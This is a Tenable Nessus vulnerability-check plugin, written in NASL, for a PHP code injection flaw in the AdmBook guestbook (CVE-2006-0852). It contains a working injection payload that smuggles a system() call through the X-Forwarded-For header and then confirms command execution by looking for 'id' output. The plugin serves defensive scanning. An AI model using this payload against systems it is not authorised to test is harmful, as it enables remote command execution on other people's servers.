#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21080);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-0852");
  script_bugtraq_id(16753);

  script_name(english:"Admbook content-data.php X-Forwarded-For Header Arbitrary PHP Code Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary code
injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running AdmBook, a PHP-based guestbook. 

The remote version of this software is prone to remote PHP code
injection due to a lack of sanitization of the HTTP header
'X-Forwarded-For'.  Using a specially crafted URL, a malicious user
can execute arbitrary commands on the remote server subject to the
privileges of the web server user id.");
  # https://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?28575228");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/03/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");
include("data_protection.inc");


port = get_http_port(default:80, embedded:TRUE);
if (!get_port_state(port)) exit(0, "Port "+port+" is closed.");
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP.");


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/admbook", "/guestbook", "/gb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  cmd = "id";
  magic = rand_str();

  req = http_get(
    item:string(
      dir, "/write.php?",
      "name=nessus&",
      "email=nessus@", compat::this_host(), "&",
      "message=", urlencode(str:string("Nessus ran ", SCRIPT_NAME, " at ", unixtime()))
    ),
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      'X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  # nb: there won't necessarily be any output from the first request.

  req = http_get(item:string(dir, "/content-data.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(1, "The web server on port "+port+" failed to respond.");

  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    report = string(
      "\n",
      "It was possible to execute the command '", cmd, "' on the remote\n",
      "host, which produces the following output :\n",
      "\n",
      data_protection::sanitize_uid(output:output)
    );

    security_hole(port:port, extra:report);
  }
}
